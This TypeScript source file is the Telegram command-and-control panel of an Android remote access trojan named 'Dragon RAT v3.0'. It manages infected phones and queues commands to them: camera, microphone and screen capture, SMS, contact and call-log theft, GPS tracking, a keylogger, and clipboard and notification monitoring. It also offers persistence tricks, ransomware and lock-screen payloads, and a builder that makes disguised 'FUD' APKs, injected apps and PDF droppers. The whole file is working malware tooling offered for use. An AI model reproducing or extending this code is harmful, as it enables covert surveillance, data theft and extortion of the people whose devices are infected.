import TelegramBot from 'node-telegram-bot-api';
import { config } from './config';
import * as db from './database';
import { BotInfo } from './types';
import { buildApk, getBuildsDir } from './builder';
import fs from 'fs';
import path from 'path';

let bot: TelegramBot;
let userStates: Map<number, any> = new Map(); // chatId -> { step, buildType, appName, selectedBotId }
let wsServer: any; // Will be set after WebSocket server starts

export function setWSServer(ws: any): void {
    wsServer = ws;
}

export function startBot(): void {
    if (!config.botToken) {
        console.warn('[BOT] No BOT_TOKEN configured. Telegram bot disabled.');
        return;
    }

    bot = new TelegramBot(config.botToken, { polling: true });
    console.log('[BOT] Telegram bot started');

    // ─── /start ───
    bot.onText(/\/start/, async (msg) => {
        const chatId = msg.chat.id;
        if (chatId !== config.adminId) {
            await bot.sendMessage(chatId, '⛔ Unauthorized. This is a private bot.');
            return;
        }
        userStates.delete(chatId);
        await showMainMenu(chatId);
    });

    // ─── /cancel ───
    bot.onText(/\/cancel/, async (msg) => {
        const chatId = msg.chat.id;
        userStates.delete(chatId);
        await bot.sendMessage(chatId, '❌ Cancelled.', { reply_markup: { remove_keyboard: true } });
        await showMainMenu(chatId);
    });

    // ─── Inline Keyboard Callbacks ───
    bot.on('callback_query', async (query) => {
        const chatId = query.message?.chat.id || 0;
        const msgId = query.message?.message_id || 0;
        const data = query.data || '';

        if (chatId !== config.adminId) {
            await bot.answerCallbackQuery(query.id, { text: '⛔ Unauthorized' });
            return;
        }

        await bot.answerCallbackQuery(query.id);

        try {
            await handleCallback(chatId, msgId, data);
        } catch (err: any) {
            console.error('[BOT] Callback error:', err);
            await bot.sendMessage(chatId, `❌ Error: ${err.message.slice(0, 200)}`);
        }
    });

    // ─── Text Input (for builder flow) ───
    bot.on('message', async (msg) => {
        const chatId = msg.chat.id;
        if (chatId !== config.adminId) return;
        if (!msg.text) return;
        if (msg.text.startsWith('/')) return;

        const state = userStates.get(chatId);
        if (!state) return;

        try {
            await handleUserInput(chatId, msg.text, state);
        } catch (err: any) {
            await bot.sendMessage(chatId, `❌ Error: ${err.message.slice(0, 200)}`);
        }
    });
}

// ─── Menu Display Functions ───

async function showMainMenu(chatId: number): Promise<void> {
    const counts = db.getBotCount();

    const text = `🐉 *Dragon RAT v3.0 — Telegram C2*
━━━━━━━━━━━━━━━━
🤖 Total Bots: \`${counts.total}\`
🟢 Online: \`${counts.online}\`
🔴 Offline: \`${counts.total - counts.online}\`
━━━━━━━━━━━━━━━━
*Select an option:*`;

    const keyboard: TelegramBot.InlineKeyboardButton[][] = [
        [{ text: `🤖 Bot List (${counts.online} online)`, callback_data: 'bot_list' }],
        [{ text: '📊 Dashboard', callback_data: 'dashboard' }],
        [{ text: '🛠️ Build APK', callback_data: 'build_menu' }],
        [{ text: '📈 Stats', callback_data: 'stats' }],
    ];

    await bot.sendMessage(chatId, text, {
        parse_mode: 'Markdown',
        reply_markup: { inline_keyboard: keyboard },
    });
}

async function showBotList(chatId: number, page: number = 0): Promise<void> {
    const bots = db.getAllBots();
    if (bots.length === 0) {
        await bot.sendMessage(chatId, '🤖 *No bots registered yet.*\n\nBuild and deploy an APK first.', {
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [
                    [{ text: '🛠️ Build APK', callback_data: 'build_menu' }],
                    [{ text: '🔙 Main Menu', callback_data: 'main_menu' }],
                ],
            },
        });
        return;
    }

    const keyboard: TelegramBot.InlineKeyboardButton[][] = [];
    const pageSize = 10;
    const start = page * pageSize;
    const pageBots = bots.slice(start, start + pageSize);

    for (const b of pageBots) {
        const status = b.isOnline ? '🟢' : '🔴';
        const label = `${status} ${b.phoneModel.slice(0, 18)} | ${b.country || '??'} | 🔋${b.batteryLevel}%`;
        keyboard.push([{ text: label, callback_data: `select_bot:${b.id}` }]);
    }

    // Pagination
    const navRow: TelegramBot.InlineKeyboardButton[] = [];
    if (page > 0) navRow.push({ text: '⬅️ Prev', callback_data: `bot_page:${page - 1}` });
    if (start + pageSize < bots.length) navRow.push({ text: '➡️ Next', callback_data: `bot_page:${page + 1}` });
    if (navRow.length > 0) keyboard.push(navRow);

    keyboard.push([{ text: '🔙 Main Menu', callback_data: 'main_menu' }]);

    await bot.sendMessage(chatId, `🤖 *Bots (${bots.length} total, ${bots.filter(b => b.isOnline).length} online)*`, {
        parse_mode: 'Markdown',
        reply_markup: { inline_keyboard: keyboard },
    });
}

async function showBotPanel(chatId: number, botId: string): Promise<void> {
    const botInfo = db.getBot(botId);
    if (!botInfo) {
        await bot.sendMessage(chatId, '❌ Bot not found.');
        return;
    }

    userStates.set(chatId, { ...(userStates.get(chatId) || {}), selectedBotId: botId });

    const text = `🤖 *Bot Control Panel*
━━━━━━━━━━━━━━━━
📱 Device: \`${botInfo.phoneModel}\`
🤖 Android: \`${botInfo.androidVersion}\` (SDK ${botInfo.sdkLevel})
🌍 Country: \`${botInfo.country}\`
📡 IP: \`${botInfo.ip}\`
🔋 Battery: \`${botInfo.batteryLevel}%\` ${botInfo.isCharging ? '⚡' : '🔌'}
🟢 Online: \`${botInfo.isOnline}\`
👻 Hidden: \`${botInfo.isHidden}\`
━━━━━━━━━━━━━━━━
*Select category:*`;

    const keyboard: TelegramBot.InlineKeyboardButton[][] = [
        [{ text: '📸 Surveillance', callback_data: `cat:${botId}:surveillance` },
         { text: '📁 File Browser', callback_data: `cat:${botId}:files` }],
        [{ text: '📍 Location', callback_data: `cat:${botId}:location` },
         { text: '📨 SMS', callback_data: `cat:${botId}:sms` }],
        [{ text: '📞 Call Logs', callback_data: `cat:${botId}:calls` },
         { text: '👤 Contacts', callback_data: `cat:${botId}:contacts` }],
        [{ text: '📱 Device', callback_data: `cat:${botId}:device` },
         { text: '⚙️ Control', callback_data: `cat:${botId}:control` }],
        [{ text: '🛡️ Persistence', callback_data: `cat:${botId}:persist` },
         { text: '🗄️ Logs', callback_data: `cat:${botId}:logs` }],
        [{ text: '🔧 Builder', callback_data: `cat:${botId}:builder` },
         { text: '💣 Payload', callback_data: `cat:${botId}:payload` }],
        [{ text: '🔙 Back to List', callback_data: 'bot_list' },
         { text: '🏠 Main Menu', callback_data: 'main_menu' }],
    ];

    await bot.sendMessage(chatId, text, {
        parse_mode: 'Markdown',
        reply_markup: { inline_keyboard: keyboard },
    });
}

function buildCategoryKeyboard(botId: string, category: string, commands: [string, string][]): TelegramBot.InlineKeyboardButton[][] {
    const keyboard: TelegramBot.InlineKeyboardButton[][] = [];
    let row: TelegramBot.InlineKeyboardButton[] = [];

    for (const [label, cmd] of commands) {
        row.push({ text: label, callback_data: `cmd:${botId}:${cmd}` });
        if (row.length >= 2) {
            keyboard.push(row);
            row = [];
        }
    }
    if (row.length > 0) keyboard.push(row);
    keyboard.push([{ text: '🔙 Back', callback_data: `back_bot:${botId}` }]);
    return keyboard;
}

// ─── Command Categories ───

const CATEGORIES: Record<string, [string, string][]> = {
    surveillance: [
        ['📷 Camera Front', 'camera_front'],
        ['📷 Camera Back', 'camera_back'],
        ['🎙️ Record Mic (10s)', 'mic_record:10'],
        ['🖼️ Screenshot', 'screenshot'],
        ['📹 Screen Record (15s)', 'screen_record:15'],
    ],
    files: [
        ['📂 List /sdcard', 'file_list:/sdcard'],
        ['📂 List /storage', 'file_list:/storage'],
        ['📂 List /data', 'file_list:/data'],
        ['📂 Custom Path', 'file_list_custom'],
        ['📄 Read File', 'file_read'],
        ['⬆️ Upload File', 'file_upload'],
        ['⬇️ Download File', 'file_download'],
        ['🗑️ Delete File', 'file_delete'],
    ],
    location: [
        ['📍 Get GPS', 'gps_once'],
        ['🔄 GPS Tracking (on)', 'gps_track:on'],
        ['⏹️ GPS Tracking (off)', 'gps_track:off'],
    ],
    sms: [
        ['📨 Read Inbox', 'sms_inbox'],
        ['✉️ Send SMS', 'sms_send'],
        ['📢 SMS Broadcast', 'sms_broadcast'],
        ['🗑️ Delete SMS', 'sms_delete'],
    ],
    calls: [
        ['📞 Get Call Logs', 'call_logs'],
        ['🗑️ Clear Call Logs', 'call_logs_clear'],
    ],
    contacts: [
        ['👤 List Contacts', 'contacts_list'],
        ['🔍 Search Contacts', 'contacts_search'],
    ],
    device: [
        ['ℹ️ Device Info', 'device_info'],
        ['📋 Installed Apps', 'installed_apps'],
        ['🔋 Battery Status', 'battery_status'],
        ['📡 SIM Info', 'sim_info'],
        ['🌐 Network Info', 'network_info'],
    ],
    control: [
        ['🔒 Lock Device', 'lock_device'],
        ['🔄 Reboot', 'reboot'],
        ['📳 Vibrate (5s)', 'vibrate:5000'],
        ['🔊 Max Volume', 'max_volume'],
        ['🔇 Silent Mode', 'silent_mode'],
        ['🔔 Send Notification', 'send_notif'],
        ['🔗 Open URL', 'open_url'],
        ['💬 Toast Message', 'toast'],
    ],
    persist: [
        ['👻 Hide Icon', 'hide_icon'],
        ['👁️ Show Icon', 'show_icon'],
        ['🛡️ Grant Admin', 'grant_admin'],
        ['🔄 Enable Autostart', 'enable_autostart'],
        ['🔋 Battery Bypass', 'battery_bypass'],
    ],
    logs: [
        ['▶️ Start Keylogger', 'keylogger_start'],
        ['⏹️ Stop Keylogger', 'keylogger_stop'],
        ['📄 Get Keylogs', 'keylogger_get'],
        ['🔔 Start Notification Monitor', 'notif_monitor_start'],
        ['🔕 Stop Notification Monitor', 'notif_monitor_stop'],
        ['📋 Get Clipboard', 'clipboard_get'],
        ['📋 Start Clipboard Monitor', 'clipboard_monitor_start'],
    ],
    builder: [
        ['📱 Build Standalone APK', 'build_standalone'],
        ['💉 Inject into APK', 'build_inject'],
        ['📄 PDF Dropper', 'build_pdf'],
        ['📱 QR Code', 'build_qr'],
    ],
    payload: [
        ['📎 Update Payload', 'update_payload'],
        ['🗑️ Self Destruct', 'self_destruct'],
        ['🔒 Lock Screen (RX)', 'lock_screen_rx'],
        ['💰 Ransomware', 'ransomware'],
    ],
};

// ─── Callback Handler ───

async function handleCallback(chatId: number, msgId: number, data: string): Promise<void> {
    // ── Main Menu ──
    if (data === 'main_menu') {
        await showMainMenu(chatId);
        return;
    }

    // ── Back to Bot ──
    if (data.startsWith('back_bot:')) {
        const botId = data.split(':')[1];
        await showBotPanel(chatId, botId);
        return;
    }

    // ── Bot List ──
    if (data === 'bot_list') {
        await showBotList(chatId);
        return;
    }

    // ── Bot List Pagination ──
    if (data.startsWith('bot_page:')) {
        const page = parseInt(data.split(':')[1], 10);
        await showBotList(chatId, page);
        return;
    }

    // ── Select Bot ──
    if (data.startsWith('select_bot:')) {
        const botId = data.split(':')[1];
        await showBotPanel(chatId, botId);
        return;
    }

    // ── Dashboard ──
    if (data === 'dashboard') {
        const counts = db.getBotCount();
        const bots = db.getAllBots();
        const online = bots.filter(b => b.isOnline);

        const text = `📊 *Dashboard*
━━━━━━━━━━━━━━━━
🤖 Total: \`${counts.total}\`
🟢 Online: \`${counts.online}\`
🔴 Offline: \`${counts.total - counts.online}\`
━━━━━━━━━━━━━━━━
*Online Devices:*
${online.length === 0 ? 'None' : online.slice(0, 10).map(b =>
    `• ${b.phoneModel} | ${b.country} | 🔋${b.batteryLevel}%`
).join('\n')}
${online.length > 10 ? `\n...and ${online.length - 10} more` : ''}`;

        await bot.sendMessage(chatId, text, {
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [
                    [{ text: '🤖 Bot List', callback_data: 'bot_list' }],
                    [{ text: '🔙 Main Menu', callback_data: 'main_menu' }],
                ],
            },
        });
        return;
    }

    // ── Stats ──
    if (data === 'stats') {
        const counts = db.getBotCount();
        const bots = db.getAllBots();
        const countries = new Map<string, number>();
        const models = new Map<string, number>();
        for (const b of bots) {
            countries.set(b.country || 'Unknown', (countries.get(b.country || 'Unknown') || 0) + 1);
            models.set(b.phoneModel, (models.get(b.phoneModel) || 0) + 1);
        }

        const topCountries = [...countries.entries()].sort((a, b) => b[1] - a[1]).slice(0, 5);
        const topModels = [...models.entries()].sort((a, b) => b[1] - a[1]).slice(0, 5);

        const text = `📈 *Statistics*
━━━━━━━━━━━━━━━━
🤖 Total Bots: \`${counts.total}\`
🟢 Online: \`${counts.online}\`
━━━━━━━━━━━━━━━━
*Top Countries:*
${topCountries.map(([c, n]) => `  ${c}: ${n}`).join('\n')}

*Top Devices:*
${topModels.map(([m, n]) => `  ${m.slice(0, 20)}: ${n}`).join('\n')}`;

        await bot.sendMessage(chatId, text, {
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [[{ text: '🔙 Main Menu', callback_data: 'main_menu' }]],
            },
        });
        return;
    }

    // ── Build Menu ──
    if (data === 'build_menu') {
        const text = `🛠️ *APK Builder*
━━━━━━━━━━━━━━━━
Build FUD payloads directly on the server.

*Options:*
• Standalone APK — fresh payload with custom name
• Inject — embed payload into any legitimate APK
• PDF Dropper — PDF with embedded download link
• QR Code — QR image pointing to payload server

*Usage:* Tap an option to start building.`;

        await bot.sendMessage(chatId, text, {
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [
                    [{ text: '📱 Standalone APK', callback_data: 'build:standalone' }],
                    [{ text: '💉 Inject into APK', callback_data: 'build:inject' }],
                    [{ text: '📄 PDF Dropper', callback_data: 'build:pdf' }],
                    [{ text: '📱 QR Code', callback_data: 'build:qr' }],
                    [{ text: '🔙 Main Menu', callback_data: 'main_menu' }],
                ],
            },
        });
        return;
    }

    // ── Build: Start input flow ──
    if (data.startsWith('build:')) {
        const buildType = data.split(':')[1];
        userStates.set(chatId, { step: 'await_app_name', buildType });
        await bot.sendMessage(chatId,
            `📝 *Building: ${buildType}*\n\nSend me the *app name* (e.g., \`Google Update\`, \`System Service\`):\n\nOr type /cancel to abort.`,
            { parse_mode: 'Markdown' }
        );
        return;
    }

    // ── Category Selection ──
    if (data.startsWith('cat:')) {
        const parts = data.split(':');
        const botId = parts[1];
        const category = parts[2];

        const commands = CATEGORIES[category];
        if (!commands) {
            await bot.sendMessage(chatId, '❌ Unknown category.');
            return;
        }

        const categoryNames: Record<string, string> = {
            surveillance: '📸 Surveillance',
            files: '📁 File Browser',
            location: '📍 Location',
            sms: '📨 SMS',
            calls: '📞 Call Logs',
            contacts: '👤 Contacts',
            device: '📱 Device Info',
            control: '⚙️ Device Control',
            persist: '🛡️ Persistence',
            logs: '🗄️ Logs & Monitoring',
            builder: '🔧 Builder Tools',
            payload: '💣 Payload',
        };

        const text = `📁 *${categoryNames[category] || category}*\nSelect a command:`;
        await bot.sendMessage(chatId, text, {
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: buildCategoryKeyboard(botId, category, commands),
            },
        });
        return;
    }

    // ── Execute Command ──
    if (data.startsWith('cmd:')) {
        const parts = data.split(':');
        const botId = parts[1];
        const cmdFull = parts.slice(2).join(':');
        const [command, ...argParts] = cmdFull.split(':');
        const args: Record<string, any> = {};

        // Handle special commands that need user input
        if (command === 'file_list_custom' || command === 'file_read' || command === 'file_download' ||
            command === 'file_delete' || command === 'sms_send' || command === 'sms_broadcast' ||
            command === 'sms_delete' || command === 'send_notif' || command === 'open_url' ||
            command === 'toast' || command === 'contacts_search') {

            userStates.set(chatId, {
                step: 'await_' + command,
                selectedBotId: botId,
                command,
            });

            const prompts: Record<string, string> = {
                file_list_custom: '📂 Enter directory path (e.g., /sdcard/Downloads):',
                file_read: '📄 Enter file path to read:',
                file_download: '⬇️ Enter file path to download:',
                file_delete: '🗑️ Enter file path to delete:',
                sms_send: '✉️ Enter recipient phone number and message (format: +1234567890|Hello):',
                sms_broadcast: '📢 Enter message to broadcast to all contacts:',
                sms_delete: '🗑️ Enter SMS ID to delete:',
                send_notif: '🔔 Enter notification title and text (format: Title|Message):',
                open_url: '🔗 Enter URL to open:',
                toast: '💬 Enter toast message text:',
                contacts_search: '🔍 Enter name or phone to search:',
            };

            await bot.sendMessage(chatId, prompts[command] || `Enter value for ${command}:`, {
                parse_mode: 'Markdown',
                reply_markup: {
                    inline_keyboard: [[{ text: '🔙 Cancel', callback_data: `back_bot:${botId}` }]],
                },
            });
            return;
        }

        // Parse args from command string (e.g., "mic_record:10" -> command="mic_record", args={duration:10})
        if (argParts.length > 0) {
            const argVal = argParts.join(':');
            if (command === 'file_list') args.path = argVal;
            else if (command === 'mic_record' || command === 'screen_record') args.duration = parseInt(argVal, 10) || 10;
            else if (command === 'vibrate') args.duration = parseInt(argVal, 10) || 5000;
            else if (command === 'gps_track') args.enabled = argVal === 'on';
        }

        // Create command in database
        const cmd = db.createCommand(botId, command, args);
        const botInfo = db.getBot(botId);

        // Send via WebSocket if online
        let sent = false;
        if (wsServer && botInfo?.isOnline) {
            try {
                sent = wsServer.sendToBot(botId, {
                    id: cmd.id,
                    command: cmd.command,
                    args: args,
                });
            } catch {}
        }

        const statusText = sent ? '✅ Command sent instantly!' : '⏳ Bot offline — queued for delivery';

        await bot.sendMessage(chatId,
            `*${statusText}*\n━━━━━━━━━━━━━━━━\n🤖 \`${botInfo?.phoneModel || botId.slice(0, 12)}...\`\n📋 Command: \`${command}\`\n🆔 ID: \`${cmd.id}\`\n━━━━━━━━━━━━━━━━`,
            {
                parse_mode: 'Markdown',
                reply_markup: {
                    inline_keyboard: [
                        [{ text: '🔄 Check Result', callback_data: `check:${cmd.id}:${botId}` }],
                        [{ text: '🔙 Back', callback_data: `back_bot:${botId}` }],
                    ],
                },
            }
        );
        return;
    }

    // ── Check Command Result ──
    if (data.startsWith('check:')) {
        const parts = data.split(':');
        const cmdId = parseInt(parts[1], 10);
        const botId = parts[2];

        const cmd = db.getCommand(cmdId);
        if (!cmd) {
            await bot.sendMessage(chatId, '❌ Command not found.');
            return;
        }

        if (cmd.status === 'completed') {
            const resultText = cmd.result.slice(0, 3500) || '✅ Done (no output)';
            const isLong = cmd.result.length > 3500;
            await bot.sendMessage(chatId,
                `✅ *Command Completed*\n━━━━━━━━━━━━━━━━\n📋 \`${cmd.command}\`\n🆔 \`${cmdId}\`\n━━━━━━━━━━━━━━━━\n*Result:*\n\`\`\`\n${resultText}\n\`\`\`${isLong ? '\n\n*(truncated, full result exceeds 3500 chars)*' : ''}`,
                {
                    parse_mode: 'Markdown',
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: '🔄 Refresh', callback_data: `check:${cmdId}:${botId}` }],
                            [{ text: '🔙 Back', callback_data: `back_bot:${botId}` }],
                        ],
                    },
                }
            );
        } else if (cmd.status === 'failed') {
            await bot.sendMessage(chatId,
                `❌ *Command Failed*\n━━━━━━━━━━━━━━━━\n📋 \`${cmd.command}\`\n🆔 \`${cmdId}\`\n━━━━━━━━━━━━━━━━\n*Error:* \`${cmd.result.slice(0, 500)}\``,
                {
                    parse_mode: 'Markdown',
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: '🔄 Retry', callback_data: `cmd:${botId}:${cmd.command}` }],
                            [{ text: '🔙 Back', callback_data: `back_bot:${botId}` }],
                        ],
                    },
                }
            );
        } else {
            const elapsed = Math.floor(Date.now() / 1000) - cmd.createdAt;
            await bot.sendMessage(chatId,
                `⏳ *Command: ${cmd.status}*\n━━━━━━━━━━━━━━━━\n📋 \`${cmd.command}\`\n🆔 \`${cmdId}\`\n⏱️ ${elapsed}s ago\n━━━━━━━━━━━━━━━━`,
                {
                    parse_mode: 'Markdown',
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: '🔄 Refresh', callback_data: `check:${cmdId}:${botId}` }],
                            [{ text: '🔙 Back', callback_data: `back_bot:${botId}` }],
                        ],
                    },
                }
            );
        }
        return;
    }
}

// ─── User Text Input Handler ───

async function handleUserInput(chatId: number, text: string, state: any): Promise<void> {
    const { step, buildType, selectedBotId, command } = state;

    // ── APK Builder Flow ──
    if (step === 'await_app_name') {
        state.step = 'await_app_icon';
        state.appName = text;
        await bot.sendMessage(chatId,
            `✅ App name: \`${text}\`\n\nNow send an *icon URL* (or type \`default\` for default icon):`,
            { parse_mode: 'Markdown' }
        );
        return;
    }

    if (step === 'await_app_icon') {
        const appName = state.appName;
        const iconUrl = text !== 'default' ? text : '';

        await bot.sendMessage(chatId,
            `⚙️ *Building APK...*\nName: \`${appName}\`\nType: \`${buildType}\`\n\n⏳ This takes 10-30 seconds...`,
            { parse_mode: 'Markdown' }
        );

        try {
            // Build the APK
            const apkPath = buildApk({
                appName,
                serverUrl: config.appUrl,
                wsUrl: config.appUrl.replace(/^http/, 'ws') + '/ws',
                iconUrl: iconUrl || undefined,
            });

            const fileSize = fs.statSync(apkPath).size;
            const sizeMB = (fileSize / (1024 * 1024)).toFixed(2);

            // Send the APK file
            await bot.sendDocument(chatId, apkPath, {
                caption: `✅ *Build Complete!*\n━━━━━━━━━━━━━━━━\n📱 \`${appName}.apk\`\n📦 Size: \`${sizeMB} MB\`\n🔒 Status: \`Signed & Ready\`\n━━━━━━━━━━━━━━━━\n*Server URL:* \`${config.appUrl}\``,
                parse_mode: 'Markdown',
            });

            // Cleanup
            try { fs.unlinkSync(apkPath); } catch {}

            userStates.delete(chatId);

            // Show build menu again
            await bot.sendMessage(chatId, '🛠️ *What would you like to do next?*', {
                parse_mode: 'Markdown',
                reply_markup: {
                    inline_keyboard: [
                        [{ text: '📱 Build Another', callback_data: 'build_menu' }],
                        [{ text: '🏠 Main Menu', callback_data: 'main_menu' }],
                    ],
                },
            });

        } catch (err: any) {
            await bot.sendMessage(chatId, `❌ *Build Failed*\n\`${err.message.slice(0, 500)}\``, {
                parse_mode: 'Markdown',
                reply_markup: {
                    inline_keyboard: [
                        [{ text: '🔄 Retry', callback_data: 'build_menu' }],
                        [{ text: '🏠 Main Menu', callback_data: 'main_menu' }],
                    ],
                },
            });
        }
        return;
    }

    // ── Command Input Flow (for commands needing text input) ──
    if (step?.startsWith('await_') && selectedBotId) {
        const actualCommand = command || step.replace('await_', '');
        const args: Record<string, any> = { value: text };

        // Parse specific formats
        if (actualCommand === 'sms_send') {
            const parts = text.split('|');
            if (parts.length !== 2) {
                await bot.sendMessage(chatId, '❌ Invalid format. Use: `+1234567890|Message text`', { parse_mode: 'Markdown' });
                return;
            }
            args.phone = parts[0].trim();
            args.message = parts[1].trim();
            delete args.value;
        } else if (actualCommand === 'send_notif') {
            const parts = text.split('|');
            if (parts.length !== 2) {
                await bot.sendMessage(chatId, '❌ Invalid format. Use: `Title|Message`', { parse_mode: 'Markdown' });
                return;
            }
            args.title = parts[0].trim();
            args.message = parts[1].trim();
            delete args.value;
        } else if (actualCommand === 'file_list') {
            args.path = text;
            delete args.value;
        } else if (actualCommand === 'file_read' || actualCommand === 'file_download' || actualCommand === 'file_delete') {
            args.path = text;
            delete args.value;
        } else if (actualCommand === 'sms_broadcast') {
            args.message = text;
            delete args.value;
        } else if (actualCommand === 'sms_delete') {
            args.id = text;
            delete args.value;
        } else if (actualCommand === 'open_url') {
            args.url = text;
            delete args.value;
        } else if (actualCommand === 'contacts_search') {
            args.query = text;
            delete args.value;
        }

        // Create command
        const cmd = db.createCommand(selectedBotId, actualCommand, args);
        const botInfo = db.getBot(selectedBotId);

        let sent = false;
        if (wsServer && botInfo?.isOnline) {
            try {
                sent = wsServer.sendToBot(selectedBotId, {
                    id: cmd.id,
                    command: actualCommand,
                    args,
                });
            } catch {}
        }

        userStates.delete(chatId);

        const statusText = sent ? '✅ Command sent instantly!' : '⏳ Bot offline — queued for delivery';

        await bot.sendMessage(chatId,
            `*${statusText}*\n━━━━━━━━━━━━━━━━\n🤖 \`${botInfo?.phoneModel || selectedBotId.slice(0, 12)}...\`\n📋 Command: \`${actualCommand}\`\n🆔 ID: \`${cmd.id}\`\n━━━━━━━━━━━━━━━━`,
            {
                parse_mode: 'Markdown',
                reply_markup: {
                    inline_keyboard: [
                        [{ text: '🔄 Check Result', callback_data: `check:${cmd.id}:${selectedBotId}` }],
                        [{ text: '🔙 Back', callback_data: `back_bot:${selectedBotId}` }],
                    ],
                },
            }
        );
        return;
    }

    // Unknown state — reset
    userStates.delete(chatId);
    await showMainMenu(chatId);
}

// ─── Send Result to Admin (called from WebSocket handler) ───

export function sendResultToAdmin(botId: string, cmdId: number, result: string, success: boolean): void {
    if (!bot) return;
    const cmd = db.getCommand(cmdId);
    const botInfo = db.getBot(botId);

    const statusIcon = success ? '✅' : '❌';
    const resultPreview = result.slice(0, 1500);

    bot.sendMessage(config.adminId,
        `${statusIcon} *Command Result*\n━━━━━━━━━━━━━━━━\n🤖 \`${botInfo?.phoneModel || botId.slice(0, 12)}...\`\n📋 \`${cmd?.command || 'unknown'}\`\n🆔 \`${cmdId}\`\n━━━━━━━━━━━━━━━━\n*Result:*\n\`\`\`\n${resultPreview}\n\`\`\`${result.length > 1500 ? '\n\n*(full result available via Check)*' : ''}`,
        {
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [
                    [{ text: '📋 Full Result', callback_data: `check:${cmdId}:${botId}` }],
                    [{ text: '🤖 Bot Panel', callback_data: `select_bot:${botId}` }],
                ],
            },
        }
    );
}

export function notifyBotOnline(botInfo: BotInfo): void {
    if (!bot) return;
    bot.sendMessage(config.adminId,
        `🟢 *Bot Connected!*\n━━━━━━━━━━━━━━━━\n📱 \`${botInfo.phoneModel}\`\n🤖 Android \`${botInfo.androidVersion}\`\n🌍 \`${botInfo.country}\`\n━━━━━━━━━━━━━━━━`,
        {
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [
                    [{ text: '🤖 Open Panel', callback_data: `select_bot:${botInfo.id}` }],
                ],
            },
        }
    );
}
